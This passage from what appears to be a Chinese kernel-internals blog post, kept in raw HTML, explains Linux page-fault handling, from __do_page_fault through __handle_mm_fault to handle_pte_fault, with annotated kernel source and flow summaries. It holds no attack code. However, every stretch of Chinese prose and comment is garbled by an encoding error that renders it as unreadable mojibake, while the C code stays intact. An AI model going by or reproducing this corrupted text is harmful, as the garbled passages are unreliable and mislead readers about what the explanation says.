FAULT_FLAG_ALLOW_RETRY) &#123;<br>flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;<br>flags |= FAULT_FLAG_TRIED;<br><span class="hljs-keyword">if</span> (!fatal_signal_pending(tsk))<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-comment">/* User mode? Just return to handle the fatal exception */</span><br><span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_USER)<span class="hljs-comment">/*ç”¨æˆ·æ€è§¦å‘ç”¨æˆ·åœ°å€ç©ºé—´ç¼ºé¡µå¼‚å¸¸ï¼Œäº¤ç”±ä¸Šå±‚å‡½æ•°å¤„ç†äº†*/</span><br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">/* Not returning to user mode? Handle exceptions or die: */</span><br>no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>up_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">/*é‡Šæ”¾å†…å­˜ç®¡ç†ç»“æ„çš„è¯»é”*/</span><br><span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;<br>mm_fault_error(regs, error_code, address, vma, fault);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Major/minor page fault accounting. If any of the events</span><br><span class="hljs-comment"> * returned VM_FAULT_MAJOR, we account it as a major fault.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (major) &#123;<span class="hljs-comment">/*å¦‚æœé¡µé¢æ•…éšœè¢«æ ‡è®°ä¸º Majorï¼Œåˆ™å¢åŠ ä»»åŠ¡çš„ maj_flt è®¡æ•°å™¨ï¼›å¦åˆ™ï¼Œå¢åŠ  min_flt è®¡æ•°å™¨*/</span><br>tsk-&gt;maj_flt++;<br>perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="hljs-number">1</span>, regs, address);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>tsk-&gt;min_flt++;<br>perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="hljs-number">1</span>, regs, address);<span class="hljs-comment">/*è®°å½•é¡µé¢æ•…éšœäº‹ä»¶ï¼Œç”¨äºæ€§èƒ½ç»Ÿè®¡*/</span><br>&#125;<br><br>check_v8086_mode(regs, address, tsk);<br>&#125;<br>NOKPROBE_SYMBOL(__do_page_fault);<br></code></pre></td></tr></table></figure><p>A3ğŸ‘´æ€»ç»“çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>åˆ¤æ–­ç¼ºé¡µå¼‚å¸¸åœ°å€ä½äºç”¨æˆ·åœ°å€ç©ºé—´è¿˜æ˜¯å†…æ ¸åœ°å€ç©ºé—´</li><li>ä½äºå†…æ ¸åœ°å€ç©ºé—´<ul><li>å†…æ ¸æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œ<code>vmalloc_fault()</code> å¤„ç†</li><li>ç”¨æˆ·æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ®µé”™è¯¯ï¼Œå‘é€<code>SIGSEGV</code>ä¿¡å·</li></ul></li><li>ä½äºç”¨æˆ·åœ°å€ç©ºé—´<ul><li>å†…æ ¸æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸<ul><li><code>SMAP</code>ä¿æŠ¤å·²å¼€å¯ï¼Œç»ˆæ­¢è¿›ç¨‹</li><li>è¿›ç¨‹æ— åœ°å€ç©ºé—´ | è®¾ç½®äº†ä¸å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œç»ˆæ­¢è¿›ç¨‹</li><li>è¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li></ul></li><li>ç”¨æˆ·æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸<ul><li>è®¾ç½®å¯¹åº”æ ‡å¿—ä½ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li></ul></li><li>æ£€æŸ¥æ˜¯å¦æ˜¯å†™é¡µå¼‚å¸¸ï¼Œå¯èƒ½æ˜¯é¡µä¸å­˜åœ¨&#x2F;æ— æƒé™å†™ï¼Œè®¾ç½®å¯¹åº”æ ‡å¿—ä½</li><li>æ‰¾å¯»çº¿æ€§åœ°å€æ‰€å±çš„çº¿æ€§åŒºï¼ˆ<strong>vma</strong>ï¼‰[1]<ul><li>ä¸å­˜åœ¨å¯¹åº”<code>vma</code>ï¼Œéæ³•è®¿é—®</li><li>å­˜åœ¨å¯¹åº”<code>vma</code>ï¼Œä¸”ä½äº<code>vma</code>æ‰€æè¿°åŒºåŸŸä¸­ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li><li>å­˜åœ¨å¯¹åº”<code>vma</code>ï¼Œä¸ä½äº<code>vma</code>æ‰€æè¿°åŒºåŸŸä¸­ï¼Œè¯´æ˜å¯èƒ½æ˜¯ä½äºå †æ ˆï¼ˆ<strong>stack</strong>ï¼‰ï¼Œå°è¯•å¢é•¿å †æ ˆ</li></ul></li><li>âœ³è°ƒç”¨<code>handle_mm_fault()</code>å‡½æ•°å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†ç¼ºé¡µå¼‚å¸¸çš„æ ¸å¿ƒå‡½æ•°<ul><li>å¤±è´¥äº†ï¼Œè¿›è¡Œé‡è¯•ï¼ˆè¿”å›åˆ°[1]ï¼Œåªä¼šé‡è¯•ä¸€æ¬¡ï¼‰</li><li>å…¶ä»–æ”¶å°¾å¤„ç†</li></ul></li></ul></li></ul><h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="__handle_mm_fault"></a>__handle_mm_fault</h4><p><del>æ€»8ä¼šæœ‰äººè¿4çº§é¡µè¡¨è¿˜ä¸çŸ¥é“å§</del></p><p>åœ¨<code>Linux</code>ä¸­ï¼Œè™šæ‹Ÿå†…å­˜ç®¡ç†é‡‡ç”¨äº†å¤šçº§é¡µè¡¨çš„æ–¹å¼æ¥å®ç°ã€‚åœ¨x86æ¶æ„ä¸‹ï¼Œ<code>Linux</code>ä½¿ç”¨äº†4çº§é¡µè¡¨ï¼ˆ<strong>4-level paging</strong>ï¼‰ï¼Œä¹Ÿç§°ä¸ºå¤šçº§é¡µè¡¨ï¼ˆ<strong>multilevel paging</strong>ï¼‰æˆ–è€…åˆ†å±‚é¡µè¡¨ï¼ˆ<strong>hierarchical paging</strong>ï¼‰ã€‚</p><p>4çº§é¡µè¡¨æ˜¯æŒ‡ç”±å››ä¸ªçº§åˆ«çš„é¡µè¡¨ç»„æˆçš„å±‚æ¬¡ç»“æ„ï¼Œæ¯ä¸ªçº§åˆ«çš„é¡µè¡¨è´Ÿè´£å°†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ç‰©ç†åœ°å€çš„ä¸åŒéƒ¨åˆ†ã€‚è¿™äº›çº§åˆ«ä¾æ¬¡ä¸ºï¼š</p><ol><li><strong>é¡µå…¨å±€ç›®å½•è¡¨ï¼ˆPage Global Directoryï¼ŒPGDï¼‰</strong>ï¼šç¬¬ä¸€çº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºé¡µä¸Šçº§ç›®å½•è¡¨ï¼ˆ<strong>Page Upper Directoryï¼ŒPUD</strong>ï¼‰çš„ç´¢å¼•ã€‚</li><li><strong>é¡µä¸Šçº§ç›®å½•è¡¨ï¼ˆPage Upper Directoryï¼ŒPUDï¼‰</strong>ï¼šç¬¬äºŒçº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºé¡µä¸­é—´ç›®å½•è¡¨ï¼ˆ<strong>Page Middle Directoryï¼ŒPMD</strong>ï¼‰çš„ç´¢å¼•ã€‚</li><li><strong>é¡µä¸­é—´ç›®å½•è¡¨ï¼ˆPage Middle Directoryï¼ŒPMDï¼‰</strong>ï¼šç¬¬ä¸‰çº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºé¡µè¡¨ï¼ˆ<strong>Page Tableï¼ŒPT</strong>ï¼‰çš„ç´¢å¼•ã€‚</li><li><strong>é¡µè¡¨ï¼ˆPage Tableï¼ŒPTEï¼‰</strong>ï¼šç¬¬å››çº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚</li></ol><p>å†è¦è®¤è¯†ä¸€ä¸ªç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><span class="hljs-comment">/* Target VMA */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address;<span class="hljs-comment">/* Faulting virtual address */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<span class="hljs-comment">/* FAULT_FLAG_xxx flags */</span><br><span class="hljs-type">pmd_t</span> *pmd;<span class="hljs-comment">/* Pointer to pmd entry matching</span><br><span class="hljs-comment"> * the &#x27;address&#x27;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">pte_t</span> *pte;<span class="hljs-comment">/* Pointer to pte entry matching</span><br><span class="hljs-comment"> * the &#x27;address&#x27;. NULL if the page</span><br><span class="hljs-comment"> * table hasn&#x27;t been allocated.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">spinlock_t</span> *ptl;<span class="hljs-comment">/* Page table lock.</span><br><span class="hljs-comment"> * Protects pte page table if &#x27;pte&#x27;</span><br><span class="hljs-comment"> * is not NULL, otherwise pmd.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">pgtable_t</span> prealloc_pte;<span class="hljs-comment">/* Pre-allocated pte page table.</span><br><span class="hljs-comment"> * vm_ops-&gt;map_pages() calls</span><br><span class="hljs-comment"> * alloc_set_pte() from atomic context.</span><br><span class="hljs-comment"> * do_fault_around() pre-allocates</span><br><span class="hljs-comment"> * page table to avoid allocation from</span><br><span class="hljs-comment"> * atomic context.</span><br><span class="hljs-comment"> */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __handle_mm_fault(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> <span class="hljs-title">fe</span> =</span> &#123;<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª fault_env ç»“æ„ä½“ feï¼Œå…¶ä¸­åŒ…å«äº† vmaã€address å’Œ flags ç­‰ä¿¡æ¯</span><br>.vma = vma,<br>.address = address,<br>.flags = flags,<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//é¡µå…¨å±€ç›®å½•é¡¹</span><br><span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//é¡µä¸Šçº§ç›®å½•é¡¹</span><br><br>pgd = pgd_offset(mm, address);<span class="hljs-comment">//è·å–å…¨å±€é¡µè¡¨é¡¹</span><br>pud = pud_alloc(mm, pgd, address);<span class="hljs-comment">//è·å–é¡µä¸Šçº§ç›®å½•é¡¹</span><br><span class="hljs-keyword">if</span> (!pud)<span class="hljs-comment">//è·å–é¡µä¸Šçº§ç›®å½•é¡¹å¤±è´¥ï¼Œgg</span><br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>fe.pmd = pmd_alloc(mm, pud, address);<span class="hljs-comment">//è·å–é¡µä¸­çº§ç›®å½•é¡¹</span><br><span class="hljs-keyword">if</span> (!fe.pmd)<span class="hljs-comment">//è·å–é¡µä¸­çº§ç›®å½•é¡¹å¤±è´¥ï¼Œgg</span><br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><span class="hljs-keyword">if</span> (pmd_none(*fe.pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;<span class="hljs-comment">/*é¡µé¢çš„é¡µè¡¨é¡¹ä¸ºç©ºä¸”é€æ˜å¤§é¡µå·²å¯ç”¨ï¼Œé‚£ä¹ˆå®ƒä¼šè°ƒç”¨ create_huge_pmd å‡½æ•°å°è¯•åˆ›å»ºä¸€ä¸ªå¤§é¡µã€‚è¿™ä¸ªå‡½æ•°çš„ç›®çš„æ˜¯å°è¯•å°†å¤šä¸ªç‰©ç†é¡µæ˜ å°„åˆ°ä¸€ä¸ªå¤§é¡µä¸Šï¼Œä»è€Œæé«˜å†…å­˜è®¿é—®æ•ˆç‡ã€‚8æ‡‚ï¼Œchatçš„*/</span><br><span class="hljs-type">int</span> ret = create_huge_pmd(&amp;fe);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<span class="hljs-comment">/*gg*/</span><br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">pmd_t</span> orig_pmd = *fe.pmd;<br><span class="hljs-type">int</span> ret;<br><br>barrier();<br><span class="hljs-keyword">if</span> (pmd_trans_huge(orig_pmd) || pmd_devmap(orig_pmd)) &#123;<br><span class="hljs-keyword">if</span> (pmd_protnone(orig_pmd) &amp;&amp; vma_is_accessible(vma))<br><span class="hljs-keyword">return</span> do_huge_pmd_numa_page(&amp;fe, orig_pmd);<br><br><span class="hljs-keyword">if</span> ((fe.flags &amp; FAULT_FLAG_WRITE) &amp;&amp;<br>!pmd_write(orig_pmd)) &#123;<br>ret = wp_huge_pmd(&amp;fe, orig_pmd);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>huge_pmd_set_accessed(&amp;fe, orig_pmd);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> handle_pte_fault(&amp;fe);<span class="hljs-comment">//è¿›å…¥æ ¸å¿ƒå¤„ç†å‡½æ•°</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * These routines also need to handle stuff like marking pages dirty</span><br><span class="hljs-comment"> * and/or accessed for architectures that don&#x27;t do it in hardware (most</span><br><span class="hljs-comment"> * RISC architectures).  The early dirtying is also good on the i386.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span><br><span class="hljs-comment"> * with external mmu caches can use to update those (ie the Sparc or</span><br><span class="hljs-comment"> * PowerPC hashed page tables that act as extended TLBs).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes, but allow</span><br><span class="hljs-comment"> * concurrent faults).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The mmap_sem may have been released depending on flags and our return value.</span><br><span class="hljs-comment"> * See filemap_fault() and __lock_page_or_retry().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br><span class="hljs-type">pte_t</span> entry;<br><br><span class="hljs-keyword">if</span> (unlikely(pmd_none(*fe-&gt;pmd))) &#123;<span class="hljs-comment">//é¡µè¡¨æŒ‡é’ˆä¸ºç©ºï¼Œè¡¨ç¤ºç›¸åº”çš„é¡µè¡¨é¡¹è¿˜æœªåˆ†é…ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°† fe-&gt;pte è®¾ä¸º NULL</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Leave __pte_alloc() until later: because vm_ops-&gt;fault may</span><br><span class="hljs-comment"> * want to allocate huge page, and if we expose page table</span><br><span class="hljs-comment"> * for an instant, it will be difficult to retract from</span><br><span class="hljs-comment"> * concurrent faults and from rmap lookups.</span><br><span class="hljs-comment"> */</span><br>fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* See comment in pte_alloc_one_map() */</span><br><span class="hljs-keyword">if</span> (pmd_trans_unstable(fe-&gt;pmd) || pmd_devmap(*fe-&gt;pmd))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * A regular pmd is established and it can&#x27;t morph into a huge</span><br><span class="hljs-comment"> * pmd from under us anymore at this point because we hold the</span><br><span class="hljs-comment"> * mmap_sem read mode and khugepaged takes it in write mode.</span><br><span class="hljs-comment"> * So now it&#x27;s safe to run pte_offset_map().</span><br><span class="hljs-comment"> */</span><br>fe-&gt;pte = pte_offset_map(fe-&gt;pmd, fe-&gt;address);<span class="hljs-comment">//ä½¿ç”¨ pte_offset_map å‡½æ•°è·å–ç»™å®šè™šæ‹Ÿåœ°å€çš„é¡µè¡¨é¡¹æŒ‡é’ˆï¼Œå¹¶è¯»å–è¯¥é¡µè¡¨é¡¹çš„å†…å®¹åˆ° entry å˜é‡ä¸­ã€‚</span><br><br>entry = *fe-&gt;pte;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * some architectures can have larger ptes than wordsize,</span><br><span class="hljs-comment"> * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and</span><br><span class="hljs-comment"> * CONFIG_32BIT=y, so READ_ONCE or ACCESS_ONCE cannot guarantee</span><br><span class="hljs-comment"> * atomic accesses.  The code below just needs a consistent</span><br><span class="hljs-comment"> * view for the ifs and we later double check anyway with the</span><br><span class="hljs-comment"> * ptl lock held. So here a barrier will do.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<span class="hljs-comment">//æ£€æŸ¥é¡µè¡¨é¡¹æ˜¯å¦ä¸ºç©ºï¼ˆæŒ‡å‘çš„ç‰©ç†é¡µæ¡†æ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™é‡Šæ”¾ä¹‹å‰æ˜ å°„çš„é¡µè¡¨é¡¹å¹¶å°† fe-&gt;pte è®¾ä¸ºç©ºã€‚</span><br>pte_unmap(fe-&gt;pte);<br>fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//å¦‚æœ fe-&gt;pte ä¸ºç©ºï¼Œåˆ™è¯´æ˜é¡µé¢ä¸å­˜åœ¨ï¼Œæ ¹æ® VMAï¼ˆVirtual Memory Areaï¼‰æ˜¯å¦åŒ¿åæ‰§è¡Œä¸åŒçš„é¡µé¢å¤„ç†æ“ä½œã€‚</span><br><span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br><span class="hljs-keyword">return</span> do_anonymous_page(fe);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//åˆ†é…ç‰©ç†é¡µæ¡†</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (!pte_present(entry))<span class="hljs-comment">//å¦‚æœé¡µé¢å·²ç»äº¤æ¢åˆ°ç£ç›˜ä¸Šï¼Œåˆ™æ‰§è¡Œäº¤æ¢é¡µé¢å¤„ç†æ“ä½œ</span><br><span class="hljs-keyword">return</span> do_swap_page(fe, entry);<br><br><span class="hljs-keyword">if</span> (pte_protnone(entry) &amp;&amp; vma_is_accessible(fe-&gt;vma))<span class="hljs-comment">//å¦‚æœé¡µé¢æ˜¯ä¿æŠ¤çš„ï¼Œå¹¶ä¸” VMA æ˜¯å¯è®¿é—®çš„ï¼Œåˆ™æ‰§è¡Œ NUMAï¼ˆNon-Uniform Memory Accessï¼‰é¡µé¢å¤„ç†æ“ä½œã€‚</span><br><span class="hljs-keyword">return</span> do_numa_page(fe, entry);<br><br>fe-&gt;ptl = pte_lockptr(fe-&gt;vma-&gt;vm_mm, fe-&gt;pmd);<br>spin_lock(fe-&gt;ptl);<span class="hljs-comment">//è‡ªæ—‹é”</span><br><span class="hljs-keyword">if</span> (unlikely(!pte_same(*fe-&gt;pte, entry)))<br><span class="hljs-keyword">goto</span> unlock;<br><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//å­˜åœ¨ FAULT_FLAG_WRITE æ ‡å¿—ä½ï¼Œè¡¨ç¤ºç¼ºé¡µå¼‚å¸¸ç”±å†™æ“ä½œå¼•èµ·</span><br><span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//å¯¹åº”çš„é¡µä¸å¯å†™</span><br><span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//è¿›è¡Œå†™æ—¶å¤åˆ¶ï¼Œå°†å†…å®¹å†™å…¥ç”± do_fault()-&gt;do_cow_fault()åˆ†é…çš„å†…å­˜é¡µä¸­</span><br>entry = pte_mkdirty(entry);<br>&#125;<br>entry = pte_mkyoung(entry);<span class="hljs-comment">//å°†è¯¥é¡µã€æ ‡è„ã€‘</span><br><span class="hljs-keyword">if</span> (ptep_set_access_flags(fe-&gt;vma, fe-&gt;address, fe-&gt;pte, entry,<br>fe-&gt;flags &amp; FAULT_FLAG_WRITE)) &#123;<br>update_mmu_cache(fe-&gt;vma, fe-&gt;address, fe-&gt;pte);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is needed only for protection faults but the arch code</span><br><span class="hljs-comment"> * is not yet telling us if this is a protection fault or not.</span><br><span class="hljs-comment"> * This still avoids useless tlb flushes for .text page faults</span><br><span class="hljs-comment"> * with threads.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE)<br>flush_tlb_fix_spurious_fault(fe-&gt;vma, fe-&gt;address);<br>&#125;<br>unlock:<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<span class="hljs-comment">//è§£è‡ªæ—‹é”</span><br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†æµç¨‹åŒ…æ‹¬ï¼š</p><ul><li>æ£€æŸ¥é¡µé¢å¯¹åº”çš„é¡µè¡¨é¡¹æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ºç©ºåˆ™è¡¨ç¤ºè¯¥é¡µé¢æœªä¸ç‰©ç†é¡µå»ºç«‹æ˜ å°„å…³ç³»ã€‚</li><li>å¦‚æœé¡µè¡¨é¡¹ä¸ºç©ºï¼Œè¯´æ˜é¡µé¢å¯èƒ½æ˜¯è¿›ç¨‹ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œéœ€è¦åˆ†é…ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µï¼Œå¹¶å°†å†…å®¹åˆå§‹åŒ–ä¸º0ã€‚</li><li>å¦‚æœé¡µè¡¨é¡¹ä¸ä¸ºç©ºï¼Œå¯èƒ½æ˜¯é¡µé¢å·²ç»è¢«æ¢å‡ºåˆ°äº¤æ¢ç©ºé—´ï¼Œéœ€è¦å°†å…¶äº¤æ¢å›æ¥ã€‚</li></ul><p>ç¬¬äºŒæ¬¡ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†æµç¨‹åŒ…æ‹¬ï¼š</p><ul><li>æ£€æŸ¥é¡µé¢æ˜¯å¦åœ¨ä¸»å­˜ä¸­ï¼Œå¦‚æœåœ¨ä¸»å­˜ä¸­ï¼Œç»§ç»­å¤„ç†ï¼›å¦‚æœä¸åœ¨ä¸»å­˜ä¸­ï¼Œå¯èƒ½æ˜¯å› ä¸ºé¡µé¢è¢«æ¢å‡ºåˆ°äº¤æ¢ç©ºé—´ï¼Œéœ€è¦å°†å…¶äº¤æ¢å›æ¥ã€‚</li><li>å¦‚æœé¡µé¢åœ¨ä¸»å­˜ä¸­ï¼Œæ£€æŸ¥ç¼ºé¡µå¼‚å¸¸æ˜¯å¦ç”±å†™æ“ä½œå¼•èµ·ã€‚<ul><li>å¦‚æœæ˜¯å†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ï¼Œæ£€æŸ¥é¡µé¢æ˜¯å¦å¯å†™ï¼Œå¦‚æœä¸å¯å†™ï¼Œåˆ™æ‰§è¡Œå†™æ—¶å¤åˆ¶æ“ä½œï¼›å¦‚æœå¯å†™ï¼Œåˆ™æ ‡è®°é¡µé¢ä¸ºå·²ä¿®æ”¹ã€‚</li><li>å°†æ–°å†…å®¹å†™å…¥é¡µè¡¨é¡¹ä¸­ã€‚</li></ul></li></ul><p>å› 